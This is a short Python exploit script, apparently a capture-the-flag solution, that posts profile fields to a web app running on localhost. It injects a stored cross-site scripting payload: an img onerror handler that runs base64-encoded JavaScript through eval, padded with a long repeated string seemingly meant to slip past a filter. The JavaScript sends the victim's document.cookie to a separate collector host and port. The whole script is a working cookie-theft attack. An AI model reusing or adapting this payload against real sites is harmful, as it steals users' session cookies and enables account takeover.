import base64
import os
import requests

HOST = os.getenv("HOST", "localhost")
PORT = os.getenv("PORT", 8011)

pwn_host = os.getenv("PWN_HOST", "192.168.3.8")
pwn_port = os.getenv("PWN_PORT", 18001)

URL = f"http://{HOST}:{PORT}"

payload = base64.b64encode(f"""if (document.cookie) location.href="http://{pwn_host}:{pwn_port}/?a="+document.cookie;""".encode()).decode()

bio1 = '<<'+'&'.join(['a.jp']*200)
bio2 = f'''img src=x onerror="eval(atob('{payload}'))"'''

print(len(bio1))
r = requests.post(URL, allow_redirects=False, data={
    "name": "a", "email": "", "bio1": bio1, "bio2": bio2
})

print(r.headers['Location'])
